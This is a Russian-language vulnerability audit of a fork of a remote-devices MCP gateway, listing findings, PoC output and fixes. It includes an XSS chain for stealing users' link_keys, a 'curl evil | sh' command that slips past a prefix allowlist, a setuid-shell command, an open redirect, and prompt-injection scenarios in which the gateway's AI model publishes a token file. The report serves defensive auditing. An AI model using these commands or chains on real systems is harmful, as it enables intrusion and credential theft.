# Отчёт об уязвимостях форка `nicelight/remote-devices-mcp`

**Дата:** 2026-11-19
**Объект:** форк `nicelight/remote-devices-mcp` @ `2bbc9a0` (база `LevRa7/remote-harness-mcp` 0.4.8)
**Задача:** (1) найти способы получить список всех пользователей шлюза; (2) найти способы получить
доступ к их устройствам без знания токена/link-key.
**Связанные документы:** [SECURITY_FORK_ASSESSMENT.md](SECURITY_FORK_ASSESSMENT.md),
[ARCH_admin_cannot_access_users.md](ARCH_admin_cannot_access_users.md),
[AUDIT_ALL_FILES_fork.md](AUDIT_ALL_FILES_fork.md) — полный проход по всем 205 текстовым файлам
форка (вспомогательные сервисы, установщики, Google-ветка).

---

## 1. Резюме

**Список всех пользователей получить можно — без аутентификации** (F-02, F-03). **Прямого обхода
аутентификации нет**, но есть цепочка, дающая полный доступ к чужому устройству без знания его
токена: пользовательская шара отдаётся на origin кабинета без CSP (F-01), поэтому HTML из шары
исполняет JS в сессии жертвы и выносит `link_key` всех её устройств. Плюс отдельные механизмы для
оператора шлюза (F-05, F-18) и для того, кто читает файлы сервера (F-06).

| ID | Уровень | Находка | Подтверждение |
| :--- | :--- | :--- | :--- |
| **F-01** | **critical** | Шары отдаются на origin `/account` без CSP/nosniff → XSS, угон сессии кабинета и `link_key` чужих устройств | PoC + 3 субагента |
| **F-02** | **high** | Перечисление всех имён устройств без токена по тексту `401`, `409 suggested_username`, `503` шары | PoC |
| **F-03** | **medium** | `/health` по умолчанию раскрывает имена (`streams_per_user`, `tunnel_events`), `target_user`, hostname | PoC + субагент |
| **F-04** | **high** | `registry.json` хранит `link_key` открытым текстом | код |
| **F-05** | **medium** | `MESH_READ_ONLY` не покрывает `bash_exec`/`run_job`: «жёсткая граница» обходится одной командой | код + тест |
| **F-06** | **medium** | Зная код привязки, устройство «забирает» любой Google-аккаунт (нет allowlist, нет привязки approve к инициатору); документация утверждает обратное | код + субагенты |
| **F-07** | **medium** | `client_ip()` доверяет первому `X-Forwarded-For`: обход всех rate-limit + DoS входа/привязки через `MAX_STATES`/`PAIR_MAX_PENDING` | код + субагенты |
| **F-08** | **medium** | Исчерпание пула `pending_pairs` (200 × 600 с) блокирует привязку новых устройств всем | код |
| **F-09** | **medium** | Legacy device-token в URL переживает ротацию link-key и принимается на rotate/revoke вопреки запрету | код |
| **F-10** | **medium** | `share_file`/`serve_dir` могут опубликовать `agent.env` с `MESH_TOKEN` на публичный URL | код |
| **F-11** | **medium** | Установщик и `core/*.py` без подписи/чексумм; отдаваемая версия уже не совпадает с GitHub | код + live |
| **F-12** | **medium** | Инъекция аргументов в `bin/cli.js` (`bash -c` / PowerShell склейка) | код |
| **F-13** | **medium** | Standalone `core/server.py`: без токена и без проверки `Origin` → CSRF/DNS-rebinding RCE на loopback | код |
| **F-14** | **medium** | Нет лимита размера/параллелизма relay шар → OOM шлюза для всех арендаторов | код |
| **F-15** | **medium** | Политика подтверждений обходится prefix-матчем «безопасных» команд (`cat …; curl evil \| sh`) | код |
| **F-16** | **low** | `//evil.tld` в `Location` шары проходит `startswith("/")` → open redirect | код |
| **F-17** | **low** | Fail-open `MESH_REGISTER_MODE`: любое значение кроме `pair` = открытая регистрация | код |
| **F-18** | **low** | Админ-токен: один фактор, ротация возвращает рабочие ключи владельца | код |
| **F-19** | **low** | TOCTOU в admin-approve пары → дубликат узла и потеря ключей | код |
| **F-20** | **low** | Нет верхней границы `username` в `/api/register` → раздувание registry | код |
| **F-21** | **low** | `_rate_windows` не чистится: поддельный `XFF` растит память шлюза | код |
| **F-22** | **low** | Обход редакции секретов (`$`-префикс, значение < 8 символов) → пароли в публичной телеметрии | код |
| **F-23** | **low** | `Host` отражается в `/.well-known/oauth-protected-resource` с `Cache-Control: public` | код |
| **F-24** | **info** | `instance_id` в `/health` = `hostname:pid:random` | PoC |
| **F-25** | **info** | `pair['collected']` выставляется, но не проверяется: ключи перевыдаются до TTL | код |

---

## 2. Методика

1. **Два раунда субагентов** (всего 24 запуска):
   - раунд 1 — 9 зон × (аудитор + независимый проверяющий): OAuth, привязка, registry, туннель,
     шары, кабинет, установщики, инструменты узла, перечисление;
   - раунд 2 — 6 зон в компактном режиме (registry, туннель, кабинет, инструменты узла,
     перечисление, шары) после того, как выяснилось, что часть первого результата не поместилась
     в лимит вывода.
   Проверяющий перечитывал указанные строки и выносил `confirmed / partly / refuted`, корректируя
   severity; часть находок аудиторов была понижена или уточнена (см. §5).
2. **Собственная проверка** каждой значимой находки: чтение кода с точными строками и повторный
   разбор цепочки эксплуатации.
3. **Динамические PoC на локальной копии кода**: шлюз поднимался в процессе
   (`starlette.testclient`), шары — через настоящий `core.web_share._ShareHandler` на loopback.
   Публичный шлюз форка не атаковался: только `GET` публичных страниц (health/install/account).
4. Окружение: Python 3.13, Starlette 1.7, копия репозитория `D:\tmp-rdmcp`.

Ограничения: аудит по коду, не пентест инфраструктуры; не проверялись supply-chain PyPI/npm,
компрометация GitHub-аккаунта форка, конфигурация VPS/Caddy, Android/Termux-ветка.

---

## 3. Ключевые находки

### F-01. Critical. Шары на origin кабинета → угон сессии и link-key

**Где:** `gateway.py:2813` (`_RELAY_HEADERS`), `gateway.py:3411` (`public_share_endpoint`),
`core/web_share.py` (`_ShareHandler`, `handle_http_request`).

Шары публикуются как `https://<шлюз>/<node>/<slug>/<path>` — на том же origin, что `/account`.
Содержимое шары — произвольные файлы пользователя. Заголовки узла фильтруются списком:

```python
_RELAY_HEADERS = (
    "content-type", "content-disposition", "last-modified", "etag",
    "cache-control", "location", "accept-ranges", "content-length",
)
```

CSP, `X-Content-Type-Options`, `Content-Disposition` для HTML — не передаются; `SimpleHTTPRequestHandler`
отдаёт `.html` как `text/html`. Cookie кабинета `__Host-rhm-owner` (Secure, HttpOnly, SameSite=Lax,
Path=/) уходит на весь домен.

**PoC (локальный):**

```
NODE RESPONSE /evil.html status 200
   content-type = text/html
   content-security-policy = None
   content-disposition = None
   gateway relays -> ['content-length', 'content-type', 'last-modified']

/account headers: {'cache-control': 'no-store',
  'content-security-policy': "default-src 'none'; style-src 'nonce-…'; script-src 'nonce-…'; …"}
cookie name used by the cabinet: __Host-rhm-owner
```

**Эксплуатация (кросс-тенантная):** пользователь A публикует `evil.html` в своей шаре → отправляет
ссылку владельцу B → скрипт на странице делает `fetch('/account', {credentials:'include'})`,
забирает CSRF и `link_key` всех устройств B (они отрендерены в HTML, `gateway.py:1264-1266`),
при необходимости вызывает `rotate`/`revoke`, уносит ключи. Дальше — `bash_exec` на машинах B.

**Исправление:** отдельный origin для шар (лучше) либо принудительно
`Content-Security-Policy: sandbox; default-src 'none'` + `X-Content-Type-Options: nosniff` +
`Content-Disposition: attachment` на всех relay-ответах; не рендерить `link_key` в HTML.

---

### F-02. High. Перечисление всех устройств без аутентификации

**Где:** `gateway.py:507` (`verify_token`), `2604` (`mcp_unified_endpoint`), `774`
(`api_register`), `3411` (`public_share_endpoint`).

```
GET /sse?user=definitely-not-a-node&token=x   → 401 {"message":"User 'definitely-not-a-node' is not registered."}
GET /sse?user=alice&token=wrong                → 401 {"message":"The device token is not accepted in a URL: …"}
POST /api/register {"username":"alice"}        → 409 {"suggested_username":"alice-2"}
GET /alice/share-0123456789abcdef/             → 503 "node offline: … 'alice' …"
GET /nobody/share-0123456789abcdef/            → 404 "not found"
```

Все запросы — без токена. Комбинируя, атакующий получает полный список имён и статус
онлайн/офлайн. **Исправление:** единый `401 {"error":"unauthorized"}`, убрать
`suggested_username`, одинаковый `404` для шары неизвестного/офлайн узла, rate-limit.

---

### F-03. Medium. `/health` по умолчанию раскрывает имена и диагностику

**Где:** `gateway.py:655` (`health`); тот же обработчик на `/`, `/health`, `/health-mesh`.

```python
if os.environ.get("MESH_PRIVATE_HEALTH") == "1":
    ... return JSONResponse({"status": "healthy"})
...
"instance_id": INSTANCE_ID,
"target_user": user,
"node_online": is_online,
"streams_per_user": {u: len(q) for u, q in active_sse_subscribers.items()},
"tunnel_events": list(tunnel_events),
```

PoC на чистом экземпляре: в ответе `instance_id: "MateBook16:8576:546f4053"`, `streams_per_user`
(имена узлов), `tunnel_events` (последние 10 событий с именами и причинами). При
`MESH_PRIVATE_HEALTH=1` остаётся только `{"status":"healthy"}`.

Оговорка: `ops/systemd/gateway.env.example:9` выставляет флаг, и публичный шлюз форка отдаёт
`{"status":"healthy"}` (проверено) — но минимальный `gateway.env` из
`docs/GOOGLE_OWNER_ONBOARDING.md` флаг не содержит, а в коде default-open.
**Исправление:** приватный режим по умолчанию; полная диагностика — за admin-токеном; убрать
hostname/PID.

---

### F-04. High. `link_key` хранится в открытом виде

**Где:** `gateway.py:701` (`new_node_entry`), строка 710: `"link_key": new_link_key()`.
`token_sha256` хэшируется, link-key — нет. Link-key = полный доступ к MCP
(`/mcp?user=…&token=lk_…`). Любой доступ к `registry.json` (админ, бэкап, права, ошибка раздачи)
даёт все устройства. **Исправление:** `link_key_sha256`, однократная выдача, ротация; 0600 и
шифрование бэкапов.

---

### F-05. Medium. `MESH_READ_ONLY` не является «жёсткой границей»

**Где:** `core/mcp_tools.py:1847` (`_tool_bash_exec`), `2553` (`_tool_run_job`);
комментарий-контракт — `gateway.py:2854` («MESH_READ_ONLY on the node is the hard boundary»),
`mcp_tools.py:864` («every other mutation is refused too»).

Ни `bash_exec`, ни `run_job` не проверяют `_READ_ONLY`: единственные проверки — в
`write_file/edit_file` (`mcp_tools.py:430`), `job_kill`, `mesh_update`, `device_*`.
Тест `tests/test_mcp_tools.py:594` (`test_run_job_read_only_still_runs_but_kill_blocked`) прямо
фиксирует, что в read-only команды продолжают выполняться.

Итог: пользователь, включивший read-only (или шлюз, выставивший `access=read_only`), ожидает
запрет изменений, но `tools/call bash_exec {"command":"cp /bin/sh /tmp/s; chmod 4755 /tmp/s"}`
проходит. **Исправление:** проверять `_READ_ONLY` в начале `_tool_bash_exec`/`_tool_run_job`
(или явно документировать, что read-only — только для файловых инструментов, и убрать слово
«hard boundary»).

---

### F-06. Medium. Код привязки «забирает» любой Google-аккаунт

**Где:** `gateway.py:1236` (`owner_pair_approve`), `gateway_identity.py:162-167` (`exchange`).

`exchange()` проверяет только подпись/aud/nonce/azp/email_verified — ни allowlist владельцев, ни
`hd`, ни «первый вход закрепляет владельца». `owner_pair_approve` подтверждает заявку по одному
коду и не привязывает подтверждение к инициатору:

```python
if pair['approved']:
    if pair.get('owner_subject') != owner['subject']:
        return page('Заявка уже подтверждена', ..., status=409)
else:
    approve_pair(code, pair, {}, owner['subject'])
```

Знающий код (печатается установщиком, живёт 600 с) логинится своим Google-аккаунтом, нажимает
«Подключить устройство» — и получает в `/account` чужое устройство с `link_key`.
Документация утверждает обратное: `docs/GOOGLE_OWNER_ONBOARDING.md:109` — «другой пользователь не
может присвоить её». **Исправление:** allowlist владельцев; привязка approve к инициатору
(bind-токен в state); rate-limit на `/pair` и approve.

---

### F-07. Medium. `X-Forwarded-For` обходит лимиты и даёт DoS входа/привязки

**Где:** `gateway.py:747-751` (`client_ip`), лимиты только на `782`, `944`, `1231`;
`gateway_identity.py:76,128`; `gateway.py:913,950`.

```python
def client_ip(request):
    forwarded = (request.headers.get("x-forwarded-for") or "").split(",")[0].strip()
```

Шаблон nginx (`ops/nginx/remote-harness-mcp.conf:85,102,119,135,150`) использует
`$proxy_add_x_forwarded_for` — клиентский заголовок остаётся первым, `client_ip` берёт его.
Следствия: лимиты 10/20/20 в минуту обходятся; набив 500 `states` (`MAX_STATES`) или 200
`pending_pairs`, атакующий получает `429`/`503` для всех, включая владельца (вход и привязка).

Оговорка проверяющего: на Caddy (документированный фронт форка) клиентский XFF по умолчанию
игнорируется, поэтому там обход не работает; DoS на общие счётчики остаётся возможным с нескольких
IP. **Исправление:** доверять только адресу прокси (или последнему XFF), лимиты на подсеть,
вытеснение старых state вместо отказа всем.

---

### F-08. Medium. Исчерпание пула заявок привязки

**Где:** `gateway.py:949-957`: `PAIR_TTL_SECONDS=600`, `PAIR_MAX_PENDING=200`, `POST /v1/devices/pair`
без аутентификации. 20 заявок/мин с одного IP × 600 с = ровно 200 «живых» — один клиент держит пул
заполненным; все новые привязки получают `503`. **Исправление:** квота на источник, вытеснение
старейшей заявки, `Retry-After`.

---

### F-09. Medium. Legacy-токен в URL переживает ротацию и принимается на rotate/revoke

**Где:** `gateway.py:533-535` (`allow_legacy_query`), `1084-1094` (`device_rotate`), `1121`,
`1157`, `1179` (`request_credential` без проверки источника).

`device_rotate` намеренно сохраняет `allow_legacy_query` (комментарий в коде), поэтому старый URL
`?token=<device-token>` продолжает работать, хотя UI обещает «прежняя ссылка перестанет работать».
Кроме того, `rotate`/`revoke` принимают device-token из query, хотя `verify_token` такой приём
запрещает. **Исправление:** сбрасывать legacy-флаг при ротации; требовать `source == "header"`
для state-changing эндпоинтов.

---

### F-10. Medium. Публикация `agent.env` через шару

**Где:** `core/web_share.py:567-585` (`share_file`), `642-656` (`serve_dir` блокирует только
каталог шар).

`share_file(path="~/.config/remote-harness-mcp/agent.env")` копирует файл с `MESH_TOKEN`
(device token) в публичный каталог и возвращает URL, читаемый без аутентификации. `serve_dir`
блокирует только собственный storage, но не конфиг-каталог. Токен даёт доступ к `/mcp` в заголовке
`Authorization` и к туннелю. Особенно опасно при prompt-injection в модели: «опубликуй этот файл».
**Исправление:** запретить пути конфигурации/кэша/`.env` в `share_file` и `serve_dir`.

---

### F-11. Medium. Payload без подписи, отдаваемая версия ≠ GitHub

**Где:** `gateway.py:1319` (`installer_asset`), `install.sh:957-967`.

`curl -fSL "https://${GATEWAY}/${f}"` без `sha256sum`/подписи; 22 модуля `core/*.py` +
`skills/orchestrator.md`. Живая проверка 18.11.2026: `/core/onboarding.py` и `/install.sh` на
публичном шлюзе не совпадают с GitHub HEAD (версии до `e17a0185`/`2bbc9a06`). **Исправление:**
подпись (minisign/cosign) + проверка в установщике до импорта; публикация SHA-256.

---

### F-12. Medium. Инъекция аргументов в `bin/cli.js`

**Где:** `bin/cli.js:93-110`. `rawArgs` экранирует только `"`; `$()`, бэктики, `;` остаются
активными в `bash -c "curl … | bash -s -- …"` и в PowerShell `[scriptblock]::Create($s) …`.
Источник аргументов — локальный пользователь/обёртка; риск — при подстановке внешнего значения.
**Исправление:** скачивать установщик в файл и запускать массивом аргументов без shell.

---

### F-13. Medium. Standalone-сервер: CSRF/DNS-rebinding при пустом токене

**Где:** `core/server.py:707-710` (ACAO `*`), `776-779` (`_authorized`), `840-855` (`do_POST`),
`909` (`auth_token = token or ""`), `966` (только предупреждение).

При `--token ""` (значение по умолчанию, docs: «empty disables auth (localhost-only)»)
`_token_valid()` возвращает `True`, `Origin` не проверяется, `Content-Type` не валидируется.
Любая страница в браузере жертвы может `POST http://127.0.0.1:8096/messages` с
`Content-Type: text/plain` и вызвать `bash_exec` (или DNS-rebinding). **Исправление:** требовать
токен, проверять `Origin`/`Host`, ограничить `Content-Length`.

---

### F-14. Medium. Нет лимита размера/параллелизма relay шар

**Где:** `gateway.py:3441` (`base64.b64decode` всего тела), `3597` (`ws_max_size=128 MiB`),
`core/web_share.py:85-88` (до 64 MiB). Публичный маршрут `/{user}/{rest}` без аутентификации и без
лимита; несколько параллельных запросов большого файла держат в памяти ws-кадр + JSON + байты →
OOM шлюза (все туннели в одном процессе). **Исправление:** стриминг или бюджет байт/семафор.

---

### F-15. Medium. Политика подтверждений обходится префиксом

**Где:** `core/policies.py:94-98` (`is_safe_command`), `126-133` (allow), `54-63` (blacklist).

```python
return any(cmd.startswith(prefix) for prefix in SAFE_COMMAND_PREFIXES)
```

`"cat README.md; curl -s http://evil/x.sh | sh"` проходит как безопасная (префикс `cat`), не
попадает в destructive-паттерны — и исполняется без вопроса оператору. Требует prompt-injection
в модель-координатор. **Исправление:** `shlex` + запрет `;|&$()\n`, сверка `argv[0]` с whitelist.

---

### F-16…F-25. Низкий уровень и наблюдения

| ID | Суть | Где |
| :--- | :--- | :--- |
| F-16 | `Location: //evil.tld` проходит `startswith("/")` → open redirect | `gateway.py:2831-2832` |
| F-17 | `MESH_REGISTER_MODE=closed/pairs` = открытая регистрация (fail-open) | `gateway.py:721-736` |
| F-18 | Админ-токен: один фактор; rotate отдаёт рабочий link_key, rotate-token — рабочий device token | `gateway.py:1074-1143` |
| F-19 | TOCTOU admin-approve: `await request.json()` между проверкой `approved` и `approve_pair` → второй узел | `gateway.py:1028-1037` |
| F-20 | Нет верхней границы `username` → раздувание `registry.json` | `gateway.py:791-794` |
| F-21 | `_rate_windows` не чистится: ключи от поддельного XFF растут бесконечно | `gateway.py:754-771` |
| F-22 | Редактор секретов пропускает `$`-значения и короче 8 символов → пароли в `task_metrics.json` | `core/redact.py:24,43,62` |
| F-23 | `Host` в `.well-known/oauth-protected-resource` + `Cache-Control: public` | `gateway.py:1355-1371` |
| F-24 | `instance_id` = `hostname:pid:random` в публичном `/health` | `gateway.py:671` |
| F-25 | `pair['collected']` не проверяется — ключи доступны до TTL | `gateway.py:1009` |

---

## 4. Ответы на поставленные вопросы

**«Получить всех пользователей».** Да, без токена:
- F-02 — тексты `401`/`409`/`503` различают зарегистрированные имена (полный список);
- F-03 — `/health` по умолчанию отдаёт имена из `streams_per_user`/`tunnel_events`;
- F-24 — плюс hostname шлюза.

**«Доступ без знания токена пользователя».** Прямого обхода проверки токена не найдено, но:
1. **F-01** — атакующий-арендатор получает `link_key` жертвы через её сессию кабинета (нужен клик
   по ссылке на шару) → полный доступ к устройствам;
2. **F-04** — чтение `registry.json` даёт link-key всех устройств;
3. **F-10** — публикация `agent.env` через шару отдаёт device token без токена;
4. **F-06** — зная 10-минутный код привязки, устройство забирает любой Google-аккаунт;
5. **F-11/F-12** — подмена payload установщика даёт RCE на машине устанавливающего;
6. **F-18** — админ-токен даёт рабочие ключи любого узла.

Последние три пункта — про оператора/поставку; они вынесены в
[SECURITY_FORK_ASSESSMENT.md](SECURITY_FORK_ASSESSMENT.md).

---

## 5. Что проверено и не подтвердилось

| Проверка | Результат |
| :--- | :--- |
| Path traversal в `installer_asset` (`..`, `%2e%2e`, `%2e%2e%2f`) | `404` — allowlist по точным именам, симлинки отвергаются |
| XSS в `/pair` через `hostname`/`os` (`<img onerror>`) | экранируется (`&lt;img…`), сырой маркер отсутствует |
| `state`/`nonce` replay, привязка к браузеру | одноразовые, `state` привязан к `__Host-rhm-login` |
| `aud`/`azp`/`email_verified` в ID token | проверяются |
| CSRF/`Origin` на `/account/*`, logout, approve | без сессии/CSRF — `403` |
| IDOR в `/account/devices/{user}/{action}` | фильтр `owner_subject` → `404` |
| `rotate`/`revoke` без токена | `403`; сравнение constant-time; токен — `sha256` |
| Захват имени через `/api/register` без токена | `409` |
| Перебор кода привязки | 32⁸ ≈ 10¹², TTL 600 с — неосуществимо |
| Link-key в туннеле | отвергается, туннель только с device token |
| Path traversal внутри шары, симлинк наружу | `realpath`+`commonpath` → `404` |
| XSS в листинге каталога | `list_directory` экранирует имена |
| `/api/register` при включённом OAuth | `410` (проверено кодом) |

Корректировки проверяющих: F-03 понижен с high до high/medium (в примерe конфигурации флаг есть,
на публичном шлюзе включён); F-07 признан зависящим от прокси (Caddy игнорирует клиентский XFF);
F-23 признан малозначимым (нет кэширующего прокси в поставке).

---

## 6. Приоритетный план исправлений

| Приоритет | Что | Оценка |
| :--- | :--- | ---: |
| **P0** | F-01: CSP `sandbox` + `nosniff` + `attachment` на relay, затем отдельный origin для шар | 2–4 pd |
| **P0** | F-02/F-03: единые `401`/`404`, приватный `/health` по умолчанию, убрать `suggested_username` | 1 pd |
| **P1** | F-05: проверка `_READ_ONLY` в `bash_exec`/`run_job`; F-06: allowlist владельцев + bind approve | 2–3 pd |
| **P1** | F-04/F-09/F-10: `link_key_sha256`, запрет legacy-query на state-changing, запрет публикации конфига | 3–5 pd |
| **P1** | F-07/F-08: доверенный IP, квоты, вытеснение заявок | 2–3 pd |
| **P2** | F-11/F-12: подпись payload, `execFile`; F-13: токен и Origin в standalone | 3–5 pd |
| **P2** | F-14/F-15/F-16…F-25 | 5–8 pd |

---

## 7. Что можно и чего нельзя утверждать (границы уверенности)

**Нельзя утверждать «взломать чужой шлюз извне и получить устройства невозможно на 100%».**

Что подтверждено с высокой уверенностью:
- в проверенных путях **нет прямого обхода проверки токена**: `/sse`, `/mcp`, `/ws/tunnel`,
  `/account` требуют валидный device token / link-key / сессию; владелец устройства проверяется
  через `owner_subject`; сравнение секретов constant-time; `state`/`nonce` одноразовые;
- **перечисление пользователей без токена возможно** (F-02, F-03) — это подтверждено PoC;
- **доступ к чужому устройству возможен через цепочки**, а не через прямой обход: F-01 (нужен
  клик жертвы по ссылке на шару), F-06 (нужен код привязки), F-04/F-10/F-18 (нужен доступ к
  файлам/секретам), F-11 (подмена payload при установке).

Что **не** проверялось и не позволяет говорить о 100%:
- проверен один коммит (`2bbc9a0`) и ключевые файлы, а не все ~200 файлов;
- не было фаззинга, SAST/DAST, аудита зависимостей (Starlette/uvicorn/websockets/PyJWT и др.),
  проверки CVE и пентеста живой инфраструктуры (nginx/Caddy/TLS/VPS);
- не проверялась Android/Termux-ветка и сборочные скрипты;
- публичный шлюз форка **уже отдаёт код, отличающийся от GitHub** (F-11), поэтому выводы по коду
  репозитория не гарантируют поведение живого экземпляра;
- отсутствие найденной RCE в `gateway.py` не доказывает её отсутствие — это результат чтения кода,
  а не доказательство.

Отдельно: если атакующий получает **root на самом шлюзе**, он получает все устройства **по
архитектуре** (link-key в registry, админ-токен, возможность подмены кода) — это не уязвимость,
а модель доверия (см. [SECURITY_FORK_ASSESSMENT.md](SECURITY_FORK_ASSESSMENT.md)).

---

## 8. Приложение: воспроизведение

```python
import os, sys, tempfile
sys.path.insert(0, r"D:\tmp-rdmcp")
os.environ["MESH_REGISTRY_PATH"] = tempfile.mktemp()
os.environ["MESH_PUBLIC_URL"] = "http://127.0.0.1:8099"
import gateway
from starlette.testclient import TestClient
c = TestClient(gateway.app, base_url="http://127.0.0.1:8099")

c.post("/api/register", json={"username": "alice"})
print(c.get("/health").json())                                     # F-03
print(c.get("/sse", params={"user": "ghost", "token": "x"}).json())# F-02
print(c.get("/alice/share-0123456789abcdef/").status_code)         # 503 vs 404 (F-02)
```

Для F-01: поднять `core.web_share._ShareHandler` на loopback с `evil.html` и убедиться, что
`gateway._relay_headers()` сохраняет `content-type: text/html` и не добавляет CSP (вывод в §3).
